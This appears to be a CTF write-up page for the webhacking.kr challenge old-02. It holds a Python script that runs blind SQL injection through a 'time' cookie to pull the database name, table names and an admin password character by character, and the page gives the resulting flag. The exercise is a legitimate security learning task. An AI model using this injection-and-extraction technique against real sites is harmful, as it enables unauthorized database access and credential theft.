@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=6aacf4c090fc5e966ec687925a0bf39a46c3a14c">
+    <link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>old-02 | Avishai’s CTF Writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="old-02" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="…" />
+<meta property="og:description" content="…" />
+<link rel="canonical" href="http://localhost:4000/CTF_writeups/webhacking.kr/old-02.html" />
+<meta property="og:url" content="http://localhost:4000/CTF_writeups/webhacking.kr/old-02.html" />
+<meta property="og:site_name" content="Avishai’s CTF Writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="old-02" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"…","headline":"old-02","url":"http://localhost:4000/CTF_writeups/webhacking.kr/old-02.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/CTF_writeups/">
+          <h1>Avishai's CTF Writeups</h1>
+        </a>
+        <h2>...</h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/avishaigonen123/CTF_writeups" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="webhacking-old-02-solution">webhacking old-02 Solution</h1>
+
+<p>here we use blind sqli based on time variant.</p>
+
+<p>In the comment there is a time that getting changed based on the cookie, and we can see the time changed.</p>
+
+<p>here is the source code: [old-02]</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
+
+<span class="k">def</span> <span class="nf">string_to_hex</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">format</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">),</span> <span class="s">'02x'</span><span class="p">)</span> <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">s</span><span class="p">)</span>
+
+<span class="n">URL</span> <span class="o">=</span> <span class="s">"https://webhacking.kr/challenge/web-02/"</span>
+<span class="n">SESSION_ID</span> <span class="o">=</span> <span class="s">"1234"</span>
+<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s">'PHPSESSID'</span><span class="p">:</span><span class="n">SESSION_ID</span><span class="p">,</span> <span class="s">'time'</span><span class="p">:</span><span class="s">''</span><span class="p">}</span>
+<span class="n">params</span> <span class="o">=</span><span class="p">{}</span>
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">'pw'</span><span class="p">:</span><span class="s">'123'</span><span class="p">}</span>
+
+<span class="c1"># get database name
+# i = 1
+# data_base = ""
+# while True:
+#     cookies['time'] = f'ord(substr(database(),{i},1))'
+#     i += 1
+#     response = requests.post(URL, data=data, cookies=cookies)
+#     time_string = response.text.split(" ")[1][1:8]
+#     # Parse the time string into a time object
+#     time_obj = datetime.strptime(time_string, "%H:%M:%S").time()
+</span>
+<span class="c1">#     # Extract hours, minutes, and seconds
+#     hours = time_obj.hour
+#     minutes = time_obj.minute
+#     seconds = time_obj.second
+#     if minutes or seconds:
+#         data_base += chr(minutes*60+seconds)
+#         print(data_base)
+#     else:
+#         break
+</span>
+<span class="c1"># find table names
+# i = 1
+# columns_names = ""
+# while True:
+#     cookies['time'] = f'ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))'
+#     i += 1
+#     response = requests.post(URL, data=data, cookies=cookies)
+#     time_string = response.text.split(" ")[1][1:8]
+#     # Parse the time string into a time object
+#     time_obj = datetime.strptime(time_string, "%H:%M:%S").time()
+</span>
+<span class="c1">#     # Extract hours, minutes, and seconds
+#     hours = time_obj.hour
+#     minutes = time_obj.minute
+#     seconds = time_obj.second
+#     if minutes or seconds:
+#         columns_names += chr(minutes*60+seconds)
+#         print(columns_names)
+#     else:
+#         break
+</span>
+<span class="c1"># admin_area_pw,log
+</span>
+<span class="c1"># pw
+# # get password from column 
+</span><span class="n">i</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="n">passwords</span> <span class="o">=</span> <span class="s">""</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">cookies</span><span class="p">[</span><span class="s">'time'</span><span class="p">]</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'ord(substr((select group_concat(pw) from admin_area_pw),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">,1))'</span>
+
+    <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
+    <span class="n">time_string</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">:</span><span class="mi">8</span><span class="p">]</span>
+    <span class="c1"># Parse the time string into a time object
+</span>    <span class="n">time_obj</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">.</span><span class="n">strptime</span><span class="p">(</span><span class="n">time_string</span><span class="p">,</span> <span class="s">"%H:%M:%S"</span><span class="p">).</span><span class="n">time</span><span class="p">()</span>
+
+    <span class="c1"># Extract hours, minutes, and seconds
+</span>    <span class="n">hours</span> <span class="o">=</span> <span class="n">time_obj</span><span class="p">.</span><span class="n">hour</span>
+    <span class="n">minutes</span> <span class="o">=</span> <span class="n">time_obj</span><span class="p">.</span><span class="n">minute</span>
+    <span class="n">seconds</span> <span class="o">=</span> <span class="n">time_obj</span><span class="p">.</span><span class="n">second</span>
+    <span class="k">if</span> <span class="n">minutes</span> <span class="ow">or</span> <span class="n">seconds</span><span class="p">:</span>
+        <span class="n">passwords</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">minutes</span><span class="o">*</span><span class="mi">60</span><span class="o">+</span><span class="n">seconds</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">passwords</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">break</span>
+
+    
+
+</code></pre></div></div>
+
+<p>at the end, the password is <code class="language-plaintext highlighter-rouge">kudos_to_beistlab</code></p>
+
+      </section>
+    </div>
+  </body>
+</html>
